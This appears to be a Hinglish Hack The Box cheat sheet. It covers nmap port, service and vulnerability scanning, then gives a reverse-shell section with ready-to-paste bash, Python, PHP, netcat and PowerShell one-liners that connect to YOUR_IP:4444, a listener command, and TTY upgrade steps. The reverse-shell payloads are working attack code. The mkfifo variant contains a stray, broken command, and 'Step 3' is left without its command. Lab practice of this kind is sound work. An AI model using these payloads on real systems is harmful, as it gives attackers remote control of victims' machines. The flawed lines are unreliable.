nmap
Recon Port Scanner
Kya karta haiNetwork pe kaunse ports open hain, kaunsi services chal rahi hain, kaunsa OS hai — ye sab pata karta hai. HTB mein sabse pehla tool!
⚡ Pehla Scan — IP mili, ye karo sabse pehle
nmap -sC -sV -oN initial.txt TARGET_IP
Default scripts + Version detect + Output file save
nmap -p- TARGET_IP --min-rate 5000 -oN allports.txt
Sab 65535 ports scan karo — fast speed se
nmap -sC -sV -p 22,80,445 TARGET_IP -oN targeted.txt
Sirf specific ports pe deep scan
nmap -sU -p 53,161,162 TARGET_IP
UDP scan — DNS(53), SNMP(161)
nmap -sV --script vuln TARGET_IP
Vulnerability scripts run karo
FlagMatlab
-sCDefault NSE scripts run karo (basic enum)
-sVService version detect karo (Apache 2.4.18 etc.)
-p-Saare 65535 ports scan karo
-p 80,443Sirf ye specific ports
-oN fileNormal text output file mein save karo
-oA baseTeen formats mein save (normal, xml, grep)
--min-rate 5000Speed badhaao — 5000 packets/sec
-sUUDP scan (slow hai)
-OOS detection
-AsC + sV + O sab ek saath (noisy)
-T4Timing template 4 (fast)
-PnPing skip karo — firewall ke peeche bhi kaam kare
▶ Sample Output
PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 80/tcp open http Apache httpd 2.4.41 445/tcp open microsoft-ds Samba smbd 4.x
💡 HTB Tip: Pehle fast scan (-p- --min-rate 5000) karo — koi bhi port miss na ho. Phir open ports pe -sC -sV targeted scan karo!

Reverse Shell Cheat Sheet
Shells
Kya hota haiReverse shell = victim machine tum se connect karta hai (outbound). Isliye firewall bypass ho jaata hai! Tum pehle nc listener chalao, phir victim pe shell trigger karo.
👂 Step 1: Pehle Listen karo (Apni machine pe)
nc -lvnp 4444
netcat listener — shell yahan aayega
rlwrap nc -lvnp 4444
rlwrap = arrow keys aur history kaam kare!
💥 Step 2: Victim pe Run karo (RCE mile toh)
bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
Bash reverse shell — Linux
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
Python3 reverse shell
php -r '$sock=fsockopen("YOUR_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
PHP reverse shell
nc YOUR_IP 4444 -e /bin/bash
Netcat reverse shell (agar -e support kare)
nc YOUR_IP 4444; mkfifo /tmp/f; cat /tmp/f | /bin/bash 2>&1 | nc YOUR_IP 4444 > /tmp/f
nc bina -e ke — mkfifo trick
powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
PowerShell reverse shell — Windows
🔧 Shell Upgrade — TTY karo (Limited shell milne ke baad)
python3 -c 'import pty;pty.spawn("/bin/bash")'
Step 1: PTY spawn karo
Ctrl+Z → stty raw -echo → fg
Step 2: Terminal raw mode

Step 3: TERM set karo — clear command kaam kare
